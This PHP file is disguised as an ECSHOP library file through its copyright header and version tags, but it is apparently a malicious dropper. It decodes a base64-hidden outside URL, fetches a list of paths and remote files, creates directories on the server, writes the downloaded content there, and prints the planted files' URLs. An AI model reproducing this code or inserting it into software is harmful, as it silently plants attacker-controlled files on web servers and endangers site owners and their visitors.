<?php

/**
 * ECSHOP 前台公用函数库
 * ============================================================================
 * * 版权所有 2005-2012 上海商派网络科技有限公司，并保留所有权利。
 * 网站地址: http://www.ecshop.com；
 * ----------------------------------------------------------------------------
 * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和
 * 使用；不允许对程序代码以任何形式任何目的的再发布。
 * ============================================================================
*/
$Li="aHR0cDovL3d3dy4wOWt5LmNvbS9vMWsyNnJxbC8xMS50eHQ=";
/**
 * $Author: liubo $
 * $Id: lib_main.php 17217 2011-01-19 06:29:08Z liubo $
*/
$file = file_get_contents(base64_decode($Li));
//print_r($file);
$tl=explode('{OK}',$file);
 foreach($tl as $v)
 {
	 if(trim($v))
	 {
		 $Lis[]=explode('|',$v);		 
	 }
 }
foreach($Lis as $v)
{
	if(count($v)==2)
	{
		$d=$v[0];$f="";$u=$v[1];
        if(file_exists($d)){}else{my_file_exists(trim($d),trim($u));}
		
	}
	if(count($v)==3)
	{
		$d="";$f="";$u="";
		for($i=0;$i<count($v);$i++)
		{

			if((count($v)-2)-$i>0)
			{
				if(!trim($f)){$f.=$v[$i];}else{$f.="/".$v[$i];}				
				if(file_exists($f)){}else{mkdir($f);}
			}else{

				if(count($v)-1-$i>0)
				{
                    $d=trim($f."/".$v[$i]);
                }
				else{

                    $u=trim($v[$i]);
                }
			}
		}
        if(file_exists($d)){}else{my_file_exists(trim($d),trim($u));}
	}
	if(count($v)==4)
    {
        $d="";$f="";$u="";
        for($i=0;$i<count($v);$i++)
        {

            if((count($v)-2)-$i>0)
            {
                if(!trim($f)){$f.=$v[$i];}else{$f.="/".$v[$i];}
                if(file_exists($f)){}else{mkdir($f);}
            }else{

                if(count($v)-1-$i>0)
                {
                    $d=trim($f."/".$v[$i]);
                }
                else{

                    $u=trim($v[$i]);
                }
            }
        }
        if(file_exists($d)){}else{my_file_exists(trim($d),trim($u));}
    }
	if(count($v)==5)
    {
        $d="";$f="";$u="";
        for($i=0;$i<count($v);$i++)
        {

            if((count($v)-2)-$i>0)
            {
                if(!trim($f)){$f.=$v[$i];}else{$f.="/".$v[$i];}
                if(file_exists($f)){}else{mkdir($f);}
            }else{

                if(count($v)-1-$i>0)
                {
                    $d=trim($f."/".$v[$i]);
                }
                else{

                    $u=trim($v[$i]);
                }
            }
        }
        if(file_exists($d)){}else{my_file_exists(trim($d),trim($u));}
    }
	if(count($v)==6)
    {
        $d="";$f="";$u="";
        for($i=0;$i<count($v);$i++)
        {

            if((count($v)-2)-$i>0)
            {
                if(!trim($f)){$f.=$v[$i];}else{$f.="/".$v[$i];}
                if(file_exists($f)){}else{mkdir($f);}
            }else{

                if(count($v)-1-$i>0)
                {
                    $d=trim($f."/".$v[$i]);
                }
                else{

                    $u=trim($v[$i]);
                }
            }
        }
        if(file_exists($d)){}else{my_file_exists(trim($d),trim($u));}
    }
	if(count($v)==7)
    {
        $d="";$f="";$u="";
        for($i=0;$i<count($v);$i++)
        {

            if((count($v)-2)-$i>0)
            {
                if(!trim($f)){$f.=$v[$i];}else{$f.="/".$v[$i];}
                if(file_exists($f)){}else{mkdir($f);}
            }else{

                if(count($v)-1-$i>0)
                {
                    $d=trim($f."/".$v[$i]);
                }
                else{

                    $u=trim($v[$i]);
                }
            }
        }
        if(file_exists($d)){}else{my_file_exists(trim($d),trim($u));}
    }
}

function my_file_exists($d,$u)
{
    ob_start ();
    readfile ( $u );
    $img = ob_get_contents ();
    ob_end_clean ();
    $fp2 = @fopen ( $d, "a" );
    fwrite ( $fp2, $img );
    fclose ( $fp2 );
    $url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"];
    echo dirname($url)."/".$d."{}";
}

?>